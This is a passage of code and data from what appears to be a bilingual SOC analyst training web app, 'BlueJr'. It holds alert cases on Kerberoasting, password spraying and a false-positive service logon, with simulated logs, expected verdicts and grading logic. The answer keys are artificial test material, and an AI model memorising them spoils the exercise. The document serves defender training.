requested"},"ok":["0x17","rc4","rc4-hmac"]},{"id":"equipo","label":{"es":"IP de origen","en":"Source IP"},"ok":["10.20.2.21"]}],"mitre":"T1558.003","claves":["l.moreno","0x17","10.20.2.21"],"competencias":["triaje","identidad","logs","respuesta"],"explica":{"es":"Pedir tickets de 23 servicios en 48 segundos y forzar RC4 (0x17) es Kerberoasting: el atacante se lleva los tickets para romper offline las contraseñas de las cuentas de servicio. Viene de PC-ALM-021, el equipo con la baliza del jueves. Contener: aislar el equipo, deshabilitar l.moreno y escalar para rotar las contraseñas de svc_backup y del resto de servicios.","en":"Requesting tickets for 23 services in 48 seconds and forcing RC4 (0x17) is Kerberoasting: the attacker takes the tickets to crack service account passwords offline. It comes from PC-ALM-021, Thursday's beaconing PC. Contain: isolate the host, disable l.moreno and escalate so svc_backup and the other service passwords get rotated."}},{"id":"T5-02","hora":"08:50","sev":"alta","fuente":"SIEM","regla":{"es":"Un origen falla contra muchas cuentas","en":"One source fails against many accounts"},"titulo":{"es":"Un intento por cuenta contra 60 usuarios","en":"One attempt per account against 60 users"},"resumen":{"es":"4625 desde un mismo origen contra 60 cuentas distintas, una vez cada una.","en":"4625 from one source against 60 different accounts, once each."},"logs":[["08:44:01","dc","EventID=4625 TargetUserName=a.garcia IpAddress=10.20.3.41 Status=0xC000006A"],["08:44:02","dc","EventID=4625 TargetUserName=m.ortega IpAddress=10.20.3.41 Status=0xC000006A"],["08:44:03","dc","EventID=4625 TargetUserName=h.diaz IpAddress=10.20.3.41 Status=0xC000006A"],["08:46:40","dc","summary IpAddress=10.20.3.41 distinct_users=60 failures=59 password='Noviembre2026!'"],["08:46:41","dc","EventID=4624 TargetUserName=j.romero IpAddress=10.20.3.41 LogonType=3"]],"ruido":{"fuentes":["dc"],"n":12},"veredicto":"vp","accion":"contener","campos":[{"id":"usuario","label":{"es":"Cuenta que cae","en":"Account that falls"},"ok":["j.romero"]},{"id":"origen","label":{"es":"IP de origen","en":"Source IP"},"ok":["10.20.3.41"]}],"mitre":"T1110.003","claves":["j.romero","10.20.3.41"],"competencias":["triaje","identidad","logs","respuesta"],"explica":{"es":"Una contraseña probada contra muchas cuentas, una vez cada una para no bloquearlas: rociado de contraseñas. Acierta con j.romero («Noviembre2026!»). El origen es PC-FIN-007 otra vez. Contener: cambiar la contraseña de j.romero, revisar su sesión y escalar; además, proponer que se prohíban contraseñas con el mes y el año.","en":"One password tried against many accounts, once each to avoid lockouts: password spraying. It hits j.romero («Noviembre2026!»). The source is PC-FIN-007 again. Contain: reset j.romero's password, review her session and escalate; also propose banning passwords built from month and year."}},{"id":"T5-03","hora":"09:30","sev":"critica","fuente":"SIEM","regla":{"es":"Replicación de directorio desde un equipo que no es DC","en":"Directory replica vicio' condicion: LogonType IN (2,5,10)  <-- incluye 5 por error"],["13:05:40","baseline","este evento ocurre cada dia a las 13:05 desde hace 2 años (reinicio programado del servicio)"]],"ruido":{"fuentes":["win"],"n":12},"veredicto":"fp","accion":"cerrar","campos":[{"id":"logontype","label":{"es":"LogonType real del evento","en":"Actual LogonType of the event"},"ok":["5"]}],"mitre":null,"claves":["LogonType","5","svc_backup"],"competencias":["triaje","logs","comunicacion"],"explica":{"es":"LogonType 5 es «servicio»: el propio services.exe arranca el servicio de copias con su cuenta, como todos los días. La regla incluye el 5 por error, así que se dispara sin que haya ningún inicio interactivo. Falso positivo: se cierra y se pide corregir la condición de la regla (2 y 10). Leer el campo, no el título de la alerta.","en":"LogonType 5 means «service»: services.exe itself starts the backup service with its account, as every day. The rule includes 5 by mistake, so it fires without any interactive logon. False positive: close it and ask for the rule condition to be fixed (2 and 10). Read the field, not the alert title."}}]}}</script>
<script>
/* BlueJr · motor
 * Funciones puras y deterministas, sin DOM: generan los registros de cada caso, corrigen los tickets
 * y resumen el historial. La interfaz solo las consume; las pruebas unitarias las cargan con require(). */
const BJ = (() => {
  'use strict';

  /* ---------- Constantes (la ayuda y el README se generan o se comprueban contra ellas) ---------- */
  const PESOS = Object.freeze({ veredicto: 40, accion: 25, campos: 25, ticket: 10 });
  const UMBRAL_APTO = 70; // nota mínima de un turno para darlo por superado
  const TICKET_MIN = 60; // caracteres mínimos del resumen del ticket
  const VEREDICTOS = Object.freeze(['vp', 'fp', 'benigno']);
  const ACCIONES = Object.freeze(['cerrar', 'escalar', 'contener']);
  const SEVERIDADES = Object.freeze(['critica', 'alta', 'media', 'baja']);
  const COMPETENCIAS = Object.freeze(['triaje', 'logs', 'correo', 'endpoint', 'red', 'identidad', 'respuesta', 'comunicacion']);
  const LIMITES = Object.freeze({ ticket: 4000, campo: 200, relevo: 4000, evidencias: 20, nombre: 80 });

  /* ---------- Azar determinista: la misma semilla da siempre los mismos registros ---------- */
  function semilla(texto) {
    let h = 2166136261;
    for (let i = 0; i < texto.length; i++) { h ^= texto.charCodeAt(i); h = Math.imul(h, 16777619); }
    return h >>> 0;
  }
  function azar(seed) {
    let a = seed >>> 0;
    return () => { a = (a + 0x6d2b79f5) >>> 0; let t = a; t = Math.imul(t ^ (t >>> 15), t | 1); t ^= t + Math.imul(t ^ (t >>> 7), t | 61); return ((t ^ (t >>> 14)) >>> 0) / 4294967296; };
  }

  /* ---------- Ruido: actividad normal de Norte Logística alrededor de cada alerta ---------- */
  const USUARIOS = ['a.garcia', 'l.moreno', 'p.sanz', 'm.ortega', 'j.romero', 'h.diaz', 'r.ibanez', 'c.prieto', 'e.navas'];
  const EQUIPOS = [['PC-ALM-014', '10.20.2.14'], ['PC-ALM-021', '10.20.2.21'], ['PC-FIN-003', '10.20.3.33'], ['PC-FIN-007', '10.20.3.41'], ['PC-MKT-002', '10.20.4.12'], ['PC-SOP-002', '10.20.6.8'], ['PC-ALM-009', '10.20.2.9']];
  const SITIOS = ['intranet.nortelogistica.example', 'erp.nortelogistica.example', 'outlook.office.example', 'teams.office.example', 'www.transportes-ibarra.example', 'maps.example', 'docs.proveedor.example', 'tracking.paqueteria.example'];
  const EXTERNAS = ['192.0.2.33', '192.0.2.71', '198.51.100.12', '198.51.100.45', '203.0.113.20', '203.0.113.64'];
  const PROCESOS = [['chrome.exe', 'explorer.exe'], ['OUTLOOK.EXE', 'explorer.exe'], ['Teams.exe', 'explorer.exe'], ['EXCEL.EXE', 'explorer.exe'], ['svchost.exe', 'services.exe'], ['OneDrive.exe', 'explorer.exe'], ['msedge.exe', 'explorer.exe']];
  const ASUNTOS = ['Albarán 4471', 'Ruta de mañana', 'Reunión semanal', 'Inventario noviembre', 'RE: Pedido 8812', 'Turnos de diciembre', 'Factura 2026-1162'];
  const APPS = ['Outlook', 'Teams', 'SharePoint', 'OneDrive'];
  const RUTAS = ['/', '/pedidos?id=1188', '/seguimiento/ES88231', '/contacto', '/static/app.js', '/api/estado', '/login'];
  const SERVIDORES = ['SRV-FS01', 'SRV-DC01', 'SRV-SQL01', 'SRV-BKP01'];
  const SERVICIOS = ['cifs/SRV-FS01', 'HTTP/intranet', 'MSSQLSvc/SRV-SQL01:1433', 'ldap/SRV-DC01', 'host/PC-FIN-003'];

  const PLANTILLAS = {
    fw: (r, e) => `ALLOW tcp ${e(EQUIPOS)[1]}:${49152 + Math.floor(r() * 16000)} -> ${e(EXTERNAS)}:${e([443, 443, 443, 80, 53])}`,
    win: (r, e) => { const q = e(EQUIPOS); return r() < 0.7 ? `EventID=4624 LogonType=3 TargetUserName=${e(USUARIOS)} WorkstationName=${q[0]} IpAddress=${q[1]}` : `EventID=4634 LogonType=3 TargetUserName=${e(USUARIOS)}`; },
    dc: (r, e) => r() < 0.6 ? `EventID=4769 ServiceName=${e(SERVICIOS)} TargetUserName=${e(USUARIOS)} IpAddress=${e(EQUIPOS)[1]} TicketEncryptionType=0x12` : `EventID=4768 TargetUserName=${e(USUARIOS)} IpAddress=${e(EQUIPOS)[1]} PreAuthType=2 TicketEncryptionType=0x12`,
    proxy: (r, e) => `user=${e(USUARIOS)} GET https://${e(SITIOS)}/ 200 bytes=${1000 + Math.floor(r() * 90000)}`,
    dns: (r, e) => `query A ${e(SITIOS)} from ${e(EQUIPOS)[1]} NOERROR`,
    mail: (r, e) => `delivered from=${e(['avisos', 'pedidos', 'rrhh', 'logistica'])}@${e(['transportes-ibarra.example', 'nortelogistica.example', 'paqueteria.example'])} to=${e(USUARIOS)}@nortelogistica.example subject='${e(ASUNTOS)}' spf=pass dkim=pass`,
    edr: (r, e) => { const p = e(PROCESOS); return `process=${p[0]} parent=${p[1]} user=${e(USUARIOS)} host=${e(EQUIPOS)[0]} verdict=clean`; },
    vpn: (r, e) => `login OK user=${e(USUARIOS)} src=${e(EXTERNAS)} assigned=10.20.200.${10 + Math.floor(r() * 200)}`,
    entra: (r, e) => `SignIn result=success user=${e(USUARIOS)}@nortelogistica.example app=${e(APPS)} ip=192.0.2.1 geo=Madrid,ES mfa=satisfied`,
    web: (r, e) => `${e(EXTERNAS)} - - "GET ${e(RUTAS)} HTTP/1.1" 200 ${300 + Math.floor(r() * 9000)} "-" "Mozilla/5.0"`,
    waf: (r, e) => `pass GET ${e(RUTAS)} from ${e(EXTERNAS)} rule=- status=200`
  };
  const ORIGEN = { fw: 'fw01', win: 'win', dc: 'dc', proxy: 'proxy01', dns: 'dns', mail: 'mail', edr: 'edr', vpn: 'vpn01', entra: 'entra', web: 'web-SRV-WEB01', waf: 'waf' };

  const aSeg = (h) => { const [a, b, c = 0] = String(h).split(':').map(Number); return a * 3600 + b * 60 + c; };
  const aHora = (s) => [Math.floor(s / 3600), Math.floor((s % 3600) / 60), s % 60].map((n) => String(n).padStart(2, '0')).join(':');

  /** Registros del caso: la señal del caso mezclada con ruido determinista y ordenada por hora. */
  function registros(caso) {
    const r = azar(semilla(caso.id));
    const senal = caso.logs.map(([t, s, m], i) => ({ t, s, m, senal: true, n: i }));
    // El ruido nunca reutiliza a las personas ni a los equipos del caso: no debe parecer evidencia.
    const texto = senal.map((l) => l.m + ' ' + l.s).join(' ').toLowerCase();
    const ajeno = (v) => !texto.includes(String(v).toLowerCase());
    const filtra = (lista) => { const f = lista.filter((x) => (Array.isArray(x) ? x.every(ajeno) : ajeno(x))); return f.length ? f : lista; };
    const usuarios = filtra(USUARIOS), equipos = filtra(EQUIPOS);
    const e = (lista) => { const l = lista === USUARIOS ? usuarios : lista === EQUIPOS ? equipos : lista; return l[Math.floor(r() * l.length)]; };
    const tiempos = senal.map((l) => aSeg(l.t));
    const ini = Math.min(...tiempos) - 300, fin = Math.max(...tiempos) + 120;
    const fuentes = (caso.ruido && caso.ruido.fuentes || []).filter((f) => PLANTILLAS[f]);
    const ruido = [];
    for (let i = 0; fuentes.length && i < (caso.ruido.n || 0); i++) {
      const f = e(fuentes);
      const m = PLANTILLAS[f](r, e);
      const s = f === 'win' ? 'win-' + e(SERVIDORES) : ORIGEN[f];
      ruido.push({ t: aHora(ini + Math.floor(r() * (fin - ini))), s, m, senal: false, n: 100 + i });
    }
    return [...senal, ...ruido].sort((a, b) => a.t.localeCompare(b.t) || a.n - b.n);
  }

  /* ---------- Corrección ---------- */
  const normalizar = (v) => String(v ?? '').normalize('NFKC').trim().toLowerCase().replace(/\s+/g, ' ').replace(/[.;,]+$/, '').replace(/^["'«]+|["'»]+$/g, '');
  const padreMitre = (id) => String(id).split('.')[0];

  /** Campos que hay que rellenar: los del caso y, si tiene técnica, el ID de MITRE ATT&CK. */
  function camposDe(caso) {
    const c = caso.campos.slice();
    if (caso.mitre) {
      const ok = [caso.mitre, padreMitre(caso.mitre), ...(caso.mitreAlt || []), ...(caso.mitreAlt || []).map(padreMitre)];
      c.push({ id: 'mitre', label: { es: 'Técnica MITRE ATT&CK (ID)', en: 'MITRE ATT&CK technique (ID)' }, ok: [...new Set(ok)], derivado: true, mitre: true });
    }
    return c;
  }

  const campoBien = (campo, valor) => {
    const v = normalizar(valor);
    if (!v) return false;
    return campo.ok.some((o) => normalizar(o) === v || (campo.mitre && v.toUpperCase() === String(o).toUpperCase()));
  };

  /** Palabras clave del caso que aparecen en el resumen del ticket. */
  function clavesEn(caso, texto) {
    const t = normalizar(texto);
    return caso.claves.map((k) => ({ clave: k, ok: t.includes(normalizar(k)) }));
  }

  /**
   * Corrige un ticket. Devuelve la nota (0-100), el detalle por criterio y lo esperado.
   * Ticket: la mitad de los puntos por llegar a TICKET_MIN caracteres y la otra mitad por citar
   * al menos la mitad de las claves del caso (IP, cuenta, equipo, cambio…).
   */
  function corregir(caso, resp = {}) {
    const campos = camposDe(caso);
    const detalleCampos = campos.map((c) => ({ id: c.id, label: c.label, valor: String(resp.campos?.[c.id] ?? ''), ok: campoBien(c, resp.campos?.[c.id]), esperado: c.ok[0] }));
    const aciertoCampos = campos.length ? detalleCampos.filter((d) => d.ok).length / campos.length : 1;
    const texto = String(resp.ticket ?? '');
    const claves = clavesEn(caso, texto);
    const necesarias = Math.ceil(caso.claves.length / 2);
    const largo = texto.trim().length >= TICKET_MIN;
    const citas = claves.filter((k) => k.ok).length >= necesarias;
    const criterios = [
      { id: 'veredicto', peso: PESOS.veredicto, puntos: resp.veredicto === caso.veredicto ? PESOS.veredicto : 0, esperado: caso.veredicto, valor: resp.veredicto ?? null },
      { id: 'accion', peso: PESOS.accion, puntos: resp.accion === caso.accion ? PESOS.accion : 0, esperado: caso.accion, valor: resp.accion ?? null },
      { id: 'campos', peso: PESOS.campos, puntos: Math.round(PESOS.campos * aciertoCampos), detalle: detalleCampos },
      { id: 'ticket', peso: PESOS.ticket, puntos: (largo ? PESOS.ticket / 2 : 0) + (citas ? PESOS.ticket / 2 : 0), largo, citas, claves, necesarias }
    ];
    const nota = criterios.reduce((s, c) => s + c.puntos, 0);
    return { id: caso.id, nota, criterios, apto: nota >= UMBRAL_APTO };
  }

  /* ---------- Turnos e historial ---------- */
  function resumenTurno(turno, respuestas = {}) {
    const notas = turno.casos.map((c) => respuestas[c.id]?.nota).filter((n) => typeof n === 'number');
    const hechos = notas.length;
    const media = hechos ? Math.round(notas.reduce((s, n) => s + n, 0) / hechos) : 0;
    const veredictos = turno.casos.filter((c) => respuestas[c.id]?.nota !== undefined && respuestas[c.id]?.veredicto === c.veredicto).length;
    return { id: turno.id, total: turno.casos.length, hechos, media, completo: hechos === turno.casos.length, apto: hechos === turno.casos.length && media >= UMBRAL_APTO, veredictos };
  }

  function historial(turnos, respuestas = {}) {
    const casos = turnos.flatMap((t) => t.casos);
    const hechos = casos.filter((c) => typeof respuestas[c.id]?.nota === 'number');

      if (reducido() || !fin) { el.textContent = num(fin) + suf; continue; }
      const t0 = performance.now(), ms = 700;
      const paso = (t) => { const k = Math.min(1, (t - t0) / ms), e = 1 - Math.pow(1 - k, 3); el.textContent = num(Math.round(fin * e)) + suf; if (k < 1) requestAnimationFrame(paso); };
      requestAnimationFrame(paso);
    }
  }

  /** Píldora del lateral que se desliza hasta la sección activa (como layoutId). */
  let ultimaY = null;
  function indicador() {
    const nav = $('.lat-nav'), ind = $('.lat-ind'), act = $('.lat-nav a[aria-current="page"]');
    if (!nav || !ind) return;
    if (!act) { ind.style.opacity = '0'; return; }
    const y = act.offsetTop, h = act.offsetHeight;
    if (ultimaY == null || reducido()) { ind.style.transition = 'none'; ind.style.transform = `translateY(${y}px)`; ind.style.height = h + 'px'; ind.style.opacity = '1'; ultimaY = y; return; }
    ind.style.transition = 'none'; ind.style.transform = `translateY(${ultimaY}px)`; ind.style.height = h + 'px'; ind.style.opacity = '1';
    requestAnimationFrame(() => { ind.style.transition = ''; ind.style.transform = `translateY(${y}px)`; });
    ultimaY = y;
  }

  return { vista, contar, indicador, reducido, EASE, DURACION, MAX_PIEZAS, ENTRADA_MAX_MS };
})();

function buscar(q) {

  resultados = [...sec, ...alertas, ...glos];
  activo = 0;
  const caja = $('#q-res');
  if (!resultados.length) { caja.innerHTML = `<p class="vacio">${esc(T('buscar_vacio'))}</p>`; return; }
  let html = '', g = '';

  $('#q')?.setAttribute('aria-activedescendant', 'q-0');
